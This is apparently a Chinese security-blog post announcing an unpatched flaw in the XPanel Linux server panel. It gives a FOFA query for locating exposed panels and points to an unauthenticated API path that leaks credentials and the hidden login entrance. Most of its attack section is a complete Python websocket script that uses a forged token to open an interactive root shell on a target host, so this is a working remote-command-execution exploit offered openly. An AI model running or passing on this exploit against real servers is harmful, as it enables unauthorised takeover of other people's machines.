#  【0day预警】最新版小皮面板(XPanel)绕过随机安全入口前台RCE方法   
原创 匿名大手子  菜狗安全   2025-04-27 01:11  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlzg5sZKIlTPHGFlkF53seUMNUsR3TKcn9VGDeJTwzichS2dI31pVDLibP6XhejxiakNbBahbqtchM5A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPlzg5sZKIlTPHGFlkF53seUgwlRhqQibojuE58lklgLm1hpT7yT88speo9QwTL6dlaFNdP9TvsdL9Q/640?wx_fmt=gif&from=appmsg "")  
  
点击上方蓝字·关注我们  
  
  
免责声明  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPlzg5sZKIlTPHGFlkF53seUZHdTe6rSPrTwIbY4nGDic3ick7JK8o2LnQqAYibZia3uZmzNvdMZiciaZMPw/640?wx_fmt=gif&from=appmsg "")  
  
  
由于传播、利用本公众号  
菜狗安全  
所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号  
菜狗安全  
及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，会立即删除并致歉。  
  
前言  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPlzg5sZKIlTPHGFlkF53seUZHdTe6rSPrTwIbY4nGDic3ick7JK8o2LnQqAYibZia3uZmzNvdMZiciaZMPw/640?wx_fmt=gif&from=appmsg "")  
  
  
**文章由交流群匿名大手子投稿**  
  
**漏洞详情作者已复现确认存在**  
  
文章目录  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPlzg5sZKIlTPHGFlkF53seUZHdTe6rSPrTwIbY4nGDic3ick7JK8o2LnQqAYibZia3uZmzNvdMZiciaZMPw/640?wx_fmt=gif&from=appmsg "")  
  
  
```
项目介绍
绕过方式 
    信息泄露
    无需入口RCE
最后        
```  
  
# 项目介绍  
  
小皮面板（XPanel）、phpStudy为河南小皮安全技术有限公司旗下产品，小皮面板（XPanel）面向Linux服务器运维领域，于2024年基于全新技术架构升级重构，产品定位是提供稳定、安全、简单易用的Linux服务器运维体验，phpStudy诞生于2007年，是一款老牌知名的PHP开发集成环境工具，产品历经多次迭代升级，目前有phpStudy经典版、phpStudy V8（2019版）小皮项目成立至今，始终坚持以公益为主导，秉持永久免费的产品理念。靠着一点点口碑的积累，小皮产品成了众多站长和开发者们的首选工具。  
  
fofa  
：  
icon_hash="-1458616391"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlfsSibH2ia8ibAmG1CYSOvJmhhj0uycQIBkInI38XLkjR8U9DEMVsdVoHiblmk936a3ft9M4Ogf66iaqw/640?wx_fmt=png&from=appmsg "")  
  
由于小皮面板搭建后端口是随机开放的，fofa探测不全，实际资产远不止这些  
# 绕过方式  
# 内容基于上一篇小皮面板(XPanel)前台RCE。  
# 【0day预警】最新版小皮面板(XPanel)组合拳前台RCE  
# 不少师傅提出，漏洞复现成功了但是由于小皮搭建后存在随机安全人口，我找不到对应的登入框，利用价值不高，这里给揭露两种绕过限制的方法  
  
  
信息泄露  
  
小皮的主程序在/xp/panel/app，我们通过go tool将主程序编译为汇编代码  
```
go tool objdump -S app > xp.asm 
```  
  
然后可以根据规则去搜索⾯板相关接⼝，有些接⼝在⾯板⾥没有使⽤到，但是可以直接调⽤的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPkLgiaiccouicOYfpZUcb0s7v3Mict3jG5ic61psYQnAnfYaGZzWHKN4D6kXicrDIRWpg10z5a7UA4JTx0g/640?wx_fmt=png&from=appmsg "")  
  
提取接口测试，发现  
/panel***/section***?section  
=  
panel  
接口存在未授权访问信息泄露  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPkLgiaiccouicOYfpZUcb0s7v3sVounM55a7OXz0ibObRzeTjaY89bXdr05GH0F0kLch4jxa8TSdckUQg/640?wx_fmt=png&from=appmsg "")  
  
会泄露⾯板的⽤户名，key，安全⼊⼝，端⼝，版本号等信息  
  
无需入口RCE  
  
小皮的终端连接无需安全面板，通过WS协议通信执行命令，只需要伪造token即可连接服务器执行命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPkLgiaiccouicOYfpZUcb0s7v3LGkKAdTTQh1o0AD6YGX0xp9WIvjOYoRxTfpy4FowWEIic4ibfvmUd8Cw/640?wx_fmt=png&from=appmsg "")  
  
写个简单的python脚本测试  
```
#!/usr/bin/env python3
import sys
import asyncio
import websockets
from typing import Optional


class WebSSHClient:
    def __init__(self, host: str):
        self.websocket: Optional[websockets.WebSocketClientProtocol] = None
        self.host = host
        self.auth_token = (
            "伪造的身份标识"
        )
        self.connected = False

    async def connect(self) -> None:
        """Establish WebSocket connection and authenticate"""
        uri = f'ws://{self.host}/wsSsh/wsSsh?machineId=1&token={self.auth_token}'
        try:
            self.websocket = await websockets.connect(uri)
            await self._authenticate()
            self.connected = True
        except Exception as e:
            print(f"Connection failed: {str(e)}")
            raise

    async def _authenticate(self) -> None:
        """Handle authentication process"""
        if not self.websocket:
            raise ConnectionError("WebSocket not initialized")

        await self.websocket.send('1')
        response = await self.websocket.recv()

        if "Last login" in response:
            print('Authentication successful!')
        else:
            print(f"Server response: {response}")

    async def run_shell(self) -> None:
        """Main interactive shell loop"""
        if not self.connected:
            print("Not connected to server")
            return

        print("\nInteractive shell (type 'exit' to quit)")
        while True:
            try:
                command = input("root@localhost# ").strip()
                if not command:
                    continue

                if command.lower() in ('exit', 'quit'):
                    print("Closing connection...")
                    await self.close()
                    return

                await self._send_command(command)
                response = await self.websocket.recv()
                print(response)

            except KeyboardInterrupt:
                print("\nUse 'exit' or 'quit' to end the session")
            except Exception as e:
                print(f"Error: {str(e)}")
                await self.close()
                return

    async def _send_command(self, command: str) -> None:
        """Format and send command to server"""
        if not self.websocket:
            raise ConnectionError("WebSocket not initialized")

        formatted_cmd = f'{{"type":2,"msg":"{command}\\r"}}'
        await self.websocket.send(formatted_cmd)

    async def close(self) -> None:
        """Cleanly close the connection"""
        if self.websocket and not self.websocket.closed:
            await self.websocket.close()
        self.connected = False


async def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <host>")
        sys.exit(1)

    host = sys.argv[1]
    client = WebSSHClient(host)

    try:
        await client.connect()
        await client.run_shell()
    except Exception as e:
        print(f"Fatal error: {str(e)}")
    finally:
        if client.connected:
            await client.close()


if __name__ == "__main__":
    try:
        asyncio.get_event_loop().run_until_complete(main())
    except KeyboardInterrupt:
        print("\nSession terminated by user")
```  
  
执行结果  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPkLgiaiccouicOYfpZUcb0s7v3XtawlCWz80SDOvrYFicI3ickcHL1XvicmvQYtYkFBBG6ADwFBxDysY5Og/640?wx_fmt=png&from=appmsg "")  
# 最后  
  
二期公开课  
《PHP代码审计速成》持续更新中...  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPkp2zicq3IJiajmo3kicxXOWwdFP3GjBSVIg2gNk5ONfHTNn4JHXribia3rhzrbRccXcMegoviaYBtZYIibA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
# 直播通知和课件都会在交流群中发布，有需要的师傅可以加我VX，备注：交流群，我拉你进群  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/QtaE6uFmibPmic8RYXMickJZbXfFDicmYbdzTb4XdVfibZH9IicN9uAezcmaqbHLP929dS7AfmybpqpczicmicZzNM42AQ/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
性感群主不定期在线水群解答问题  
  
  
